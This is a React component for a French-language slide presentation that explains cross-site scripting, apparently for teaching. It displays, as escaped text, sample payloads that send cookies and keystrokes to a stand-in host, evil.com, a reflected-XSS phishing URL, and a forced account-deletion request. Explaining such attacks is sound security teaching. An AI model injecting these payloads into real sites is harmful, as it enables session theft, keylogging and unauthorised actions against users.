import { Target, Zap, Eye, Trash2, UserCog } from "lucide-react";

const Slide02AttackPart1 = () => {
  return (
    <div className="bg-card rounded-2xl shadow-2xl p-6 md:p-8 h-full overflow-hidden flex flex-col">
      <div className="space-y-4 animate-fade-in flex-1 flex flex-col">
        <div className="text-center">
          <div className="inline-flex items-center justify-center w-12 h-12 bg-orange-500/20 rounded-full mb-2">
            <Target className="h-6 w-6 text-orange-500" />
          </div>
          <h2 className="text-2xl md:text-3xl font-bold text-foreground mb-1">
            Exemples d'Attaque XSS
          </h2>
          <p className="text-sm text-muted-foreground">
            Comment les attaquants exploitent les injections de scripts
          </p>
        </div>

        <div className="grid md:grid-cols-2 gap-4 flex-1">
          {/* Attaque 1 : Stored XSS */}
          <div className="bg-gradient-to-br from-orange-500/20 to-orange-500/10 rounded-xl p-4 border border-orange-500/30">
            <div className="flex items-center gap-2 mb-3">
              <Eye className="h-5 w-5 text-orange-500" />
              <h3 className="text-lg font-bold text-foreground">Attaque 1 : Vol de Session (Stored XSS)</h3>
            </div>
            <div className="space-y-2">
              <div className="bg-background/50 rounded-lg p-3">
                <div className="text-xs text-muted-foreground mb-1">Commentaire malveillant posté</div>
                <div className="font-mono text-xs bg-[#282c34] text-gray-200 p-2 rounded border border-border">
                  &lt;script&gt;fetch('https://evil.com/steal?c='+document.cookie)&lt;/script&gt;
                </div>
              </div>
              <div className="bg-background/50 rounded-lg p-3">
                <div className="text-xs text-destructive mt-2 font-semibold">
                  💀 Le script s'exécute pour chaque visiteur, envoyant les cookies à l'attaquant
                </div>
              </div>
            </div>
          </div>

          {/* Attaque 2 : Reflected XSS */}
          <div className="bg-gradient-to-br from-orange-500/20 to-orange-500/10 rounded-xl p-4 border border-orange-500/30">
            <div className="flex items-center gap-2 mb-3">
              <Zap className="h-5 w-5 text-orange-500" />
              <h3 className="text-lg font-bold text-foreground">Attaque 2 : Phishing (Reflected XSS)</h3>
            </div>
            <div className="bg-background/50 rounded-lg p-3">
              <div className="text-xs text-muted-foreground mb-1">URL malveillante</div>
              <div className="font-mono text-xs bg-[#282c34] text-gray-200 p-2 rounded border border-border overflow-x-auto">
                https://site.com/search?q=&lt;script&gt;...&lt;/script&gt;
              </div>
              <div className="text-xs text-destructive mt-2 font-semibold">
                💀 La page légitime est remplacée par un faux formulaire de connexion
              </div>
            </div>
          </div>

          {/* Attaque 3 : Session Recorder */}
          <div className="bg-gradient-to-br from-purple-500/20 to-purple-500/10 rounded-xl p-4 border border-purple-500/30">
            <div className="flex items-center gap-2 mb-3">
              <UserCog className="h-5 w-5 text-purple-500" />
              <h3 className="text-lg font-bold text-foreground">Attaque 3 : Session Recorder</h3>
            </div>
            <div className="bg-background/50 rounded-lg p-3">
              <div className="text-xs text-muted-foreground mb-1">Script d'enregistrement</div>
              <div className="font-mono text-xs bg-[#282c34] text-gray-200 p-2 rounded border border-border overflow-x-auto">
                document.addEventListener('keydown', e =&gt; fetch('https://evil.com/log?k='+e.key))
              </div>
              <div className="text-xs text-destructive mt-2 font-semibold">
                💀 Enregistre toutes les frappes clavier (Keylogger)
              </div>
            </div>
          </div>

          {/* Attaque 4 : Suppression */}
          <div className="bg-gradient-to-br from-destructive/20 to-destructive/10 rounded-xl p-4 border border-destructive/30">
            <div className="flex items-center gap-2 mb-3">
              <Trash2 className="h-5 w-5 text-destructive" />
              <h3 className="text-lg font-bold text-foreground">Attaque 4 : Action non autorisée</h3>
            </div>
            <div className="bg-background/50 rounded-lg p-3">
              <div className="text-xs text-muted-foreground mb-1">Injection d'action</div>
              <div className="font-mono text-xs bg-[#282c34] text-gray-200 p-2 rounded border border-border overflow-x-auto">
                fetch('/api/delete-account', {'{'}method: 'POST'{'}'})
              </div>
              <div className="text-xs text-destructive mt-2 font-semibold">
                💀 Force l'utilisateur à supprimer son compte sans son consentement
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Slide02AttackPart1;
